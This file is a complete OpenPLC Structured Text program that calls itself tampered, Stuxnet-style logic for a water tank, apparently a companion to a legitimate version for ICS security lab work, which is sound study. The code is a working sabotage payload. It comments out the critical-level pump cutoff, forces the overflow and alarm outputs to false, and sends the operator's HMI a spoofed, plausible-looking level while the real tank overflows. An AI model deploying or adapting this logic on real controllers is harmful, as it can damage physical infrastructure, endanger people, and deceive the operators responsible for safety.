(*
  =====================================================================
   water_tank_malicious.st  --  TAMPERED (Stuxnet-style) control logic
   IEC 61131-3 Structured Text, OpenPLC Runtime v3
  =====================================================================
   Uploaded by the attacker under an innocent name ("Maintenance update").
   It is byte-for-byte identical to water_tank_legit.st EXCEPT for four
   lines (see markers >>> TAMPER <<<):

     1. The critical-level SAFETY cutoff is DISABLED  -> the pump keeps
        running even above 950, so the tank overflows.
     2. The overflow latch reported to the HMI is forced FALSE.
     3. The HIGH-level ALARM reported to the HMI is forced FALSE.
     4. The level reported to the HMI (%QW0) is SPOOFED with a plausible
        oscillation, while the TRUE level is still kept in %MW10.

   Result: the operator's HMI shows a calm, normal-looking tank with no
   alarm, while the real tank silently overflows. Same register/coil map
   as the legitimate program.
  =====================================================================
*)

PROGRAM prog0
  VAR
    (* ---- Process outputs (coils) ---- *)
    Pump       AT %QX0.0 : BOOL;
    Drain      AT %QX0.1 : BOOL;
    Alarm      AT %QX0.2 : BOOL;
    Overflow   AT %QX0.3 : BOOL;

    (* ---- HMI-visible analog value (holding register %QW0 / HR0) ---- *)
    LevelHMI   AT %QW0   : INT;

    (* ---- Setpoints & commands (%MW0..2 / HR1024..1026) ---- *)
    SpHigh     AT %MW0   : INT;
    SpLow      AT %MW1   : INT;
    ManualPump AT %MW2   : INT;

    (* ---- Ground-truth level (hidden register %MW10 / HR1034) ---- *)
    TrueLevel  AT %MW10  : INT;

  END_VAR

  VAR
    (* ---- Internal state (non-located; matiec needs a separate VAR block) ---- *)
    Initialized : BOOL := FALSE;
    PumpCmd     : BOOL := FALSE;
    Tick        : TON;              (* 1-second physics tick *)
    SpoofPhase  : INT  := 0;        (* drives the spoofed HMI value *)
    SpoofDir    : INT  := 1;
  END_VAR

  (* ----- one-time initialisation ----- *)
  IF NOT Initialized THEN
    IF SpHigh = 0 THEN SpHigh := 800; END_IF;
    IF SpLow  = 0 THEN SpLow  := 200; END_IF;
    TrueLevel   := 300;
    Initialized := TRUE;
  END_IF;

  (* ===== CONTROL : sense -> decide ===== *)
  (* pump hysteresis on the TRUE level *)
  IF TrueLevel <= SpLow  THEN PumpCmd := TRUE;  END_IF;
  IF TrueLevel >= SpHigh THEN PumpCmd := FALSE; END_IF;
  (* manual override forces the pump ON *)
  IF ManualPump >= 1 THEN PumpCmd := TRUE; END_IF;

  (* >>> TAMPER 1: SAFETY critical-level cutoff DISABLED (line removed) <<< *)
  (* IF TrueLevel >= 950 THEN PumpCmd := FALSE; END_IF; *)

  Pump  := PumpCmd;
  Drain := TRUE;                    (* drain continuously open -> steady outflow *)

  (* >>> TAMPER 2: overflow latch hidden from the HMI (forced FALSE) <<< *)
  Overflow := FALSE;

  (* >>> TAMPER 3 + 4: suppress the alarm and SPOOF the HMI level <<< *)
  Alarm    := FALSE;
  LevelHMI := 470 + SpoofPhase;     (* plausible 470..650 oscillation *)

  (* ===== PHYSICS : actuate -> integrate (~once per second) ===== *)
  Tick(IN := NOT Tick.Q, PT := T#1000ms);
  IF Tick.Q THEN
    IF Pump  THEN TrueLevel := TrueLevel + 12; END_IF;   (* inflow  *)
    IF Drain THEN TrueLevel := TrueLevel - 7;  END_IF;    (* outflow *)
    IF TrueLevel < 0    THEN TrueLevel := 0;    END_IF;
    IF TrueLevel > 1000 THEN TrueLevel := 1000; END_IF;

    (* advance the plausible-looking spoof oscillation *)
    SpoofPhase := SpoofPhase + (SpoofDir * 7);
    IF SpoofPhase >= 180 THEN SpoofDir := -1; END_IF;
    IF SpoofPhase <= 0   THEN SpoofDir :=  1; END_IF;
  END_IF;

END_PROGRAM

CONFIGURATION Config0
  RESOURCE Res0 ON PLC
    TASK Main(INTERVAL := T#50ms, PRIORITY := 0);
    PROGRAM Inst0 WITH Main : prog0;
  END_RESOURCE
END_CONFIGURATION
